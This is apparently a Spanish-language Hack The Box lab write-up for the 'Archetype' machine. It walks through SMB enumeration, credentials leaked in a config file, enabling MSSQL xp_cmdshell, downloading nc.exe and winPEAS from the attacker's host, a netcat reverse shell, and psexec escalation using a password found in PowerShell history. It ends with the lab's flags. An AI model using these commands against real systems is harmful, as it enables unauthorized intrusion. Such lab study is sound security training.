---
tags:
  - CTF
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/starting-point
dificultad: Fácil
os: Windows
relacionados:
  - "[[smbclient]]"
  - "[[smbmap]]"
  - "[[mssqlclient]]"
  - "[[winpeas]]"
---
# HackTheBox - Archetype

## Reconocimiento

### Escaneo

Comienzo realizando un escaneo de puertos y servicios usando `nmap`:

```bash
nmap -sC -sV -oA nmap/archetype 10.129.206.47
```

- `-sC`: Ejecuta scripts por defecto.
- `-sV`: Intenta determinar la versión del servicio en ejecución.
- `-oA`: Genera salida en todos los formatos (normal, XML y grepable).

**Resultados del escaneo:**

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### Enumeración

#### Enumeración SMB

Para interactuar con servicios de Microsoft, la herramienta `Impacket` es extremadamente útil. Comienzo listando los recursos compartidos SMB usando `smbclient` sin autenticación:

```bash
smbclient -N -L \\\\10.129.206.47
```

**Salida:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

> [!TIP]
> Los recursos compartidos sin un `$` al final suelen ser accesibles sin privilegios administrativos. El recurso compartido `backups` parece prometedor.

##### Accediendo al recurso compartido `backups`

Me conecto al recurso compartido `backups`:
```bash
smbclient -N \\\\10.129.206.47\\backups
```

Listo el contenido:
```bash
smb: \> dir
```

**Archivos encontrados:**
```
prod.dtsConfig                     AR      609  Mon Jan 20 09:23:02 2020
```

Descargo el archivo:
```bash
smb: \> get prod.dtsConfig
```

#### Analizando `prod.dtsConfig`

El archivo contiene:

```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..."/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;...</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

**Credenciales encontradas:**

- **Nombre de usuario**: `ARCHETYPE\sql_svc`
- **Contraseña**: `M3g4c0rp123`

> [!TIP]
> Aunque `smbclient` es excelente para conectarse a recursos compartidos SMB, herramientas como `smbmap` y `crackmapexec` proporcionan información más detallada sobre los permisos de los recursos compartidos y pueden ser valiosas durante la enumeración.

___

## Explotación

### Acceso inicial a través de MSSQL

#### Conexión con `mssqlclient.py`

Utilizo `mssqlclient.py` de la suite `Impacket` para conectarme al servidor MSSQL:
```bash
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.206.47 -windows-auth
```

- `-windows-auth`: Especifica autenticación de Windows.

#### Verificando privilegios de sysadmin

Verifico si `sql_svc` tiene privilegios de sysadmin:
```sql
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
```

- Un resultado de `1` indica privilegios de sysadmin.

#### Habilitando `xp_cmdshell`

Para ejecutar comandos del sistema, necesito habilitar `xp_cmdshell`:
```sql
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```

O simplemente:
```sql
SQL> enable_xp_cmdshell
```

#### Ejecutando comandos del sistema

Pruebo la ejecución de comandos:
```sql
SQL> xp_cmdshell 'whoami';
```

**Salida:**
```
archetype\sql_svc
```

### Obteniendo una Reverse Shell

#### Configurando un listener

En mi máquina:
```bash
nc -lvnp 4444
```

#### Transfiriendo `nc64.exe` al objetivo

##### Hospedando `nc64.exe`

Hospedo `nc64.exe` usando un servidor HTTP simple:
```bash
python3 -m http.server 80
```

##### Descargando en el objetivo

Encuentro un directorio escribible, como `C:\Users\sql_svc\Downloads`, y descargo `nc64.exe`:
```sql
xp_cmdshell "powershell -c cd C:/Users/sql_svc/Downloads; wget http://10.10.14.142/nc.exe -outfile nc.exe"
```

#### Ejecutando la Reverse Shell

```sql
xp_cmdshell "powershell -c cd C:/Users/sql_svc/Downloads; ./nc.exe -e cmd.exe 10.10.14.142 4444"
```

#### Recibiendo la shell

Mi listener debería capturar la shell:
```bash
$ nc -lvnp 4444
Conexión recibida desde 10.129.206.47 49158
Microsoft Windows [Versión 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>
```

#### Obteniendo la bandera de usuario

```cmd
C:\Windows\system32> type C:\Users\sql_svc\Desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3
```

___

## Escalamiento de Privilegios

### Enumeración del sistema con `winPEAS`

#### Transfiriendo `winPEAS.exe`

En mi máquina:
```bash
python3 -m http.server 80
```

En el objetivo:
```cmd
powershell -c cd C:/Users/sql_svc/Downloads; wget http://10.10.14.142/winPEASx64.exe -outfile winpeas.exe
```

#### Ejecutando `winPEAS`
```cmd
C:\Users\sql_svc\Downloads> winPEASx64.exe
```

#### Hallazgos clave

`winPEAS` destaca:
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Analizando el historial de PowerShell

Reviso el archivo de historial de PowerShell:
```cmd
C:\Users\sql_svc\Downloads> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Credenciales encontradas:**
```
net use \\backup_server\share /user:administrator MEGACORP_4dm1n!!
```

### Obteniendo acceso como Administrador

#### Usando [[psexec]]

Utilizo `psexec.py` para conectarme como `administrator`:
```bash
psexec.py administrator@10.129.206.47
```

Cuando se me solicita, ingreso la contraseña: `MEGACORP_4dm1n!!`

#### Verificando privilegios

```cmd
C:\Windows\system32> whoami
nt authority\system
```

#### Obteniendo la bandera de root

```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```

___

## Bandera(s)

> [!FLAG] **Bandera de Usuario**
>
> `3e7b102e78218e935bf3f4951fec21a3`

> [!FLAG] **Bandera de Root**
>
> `b91ccec3305e98240082d4474b848528`
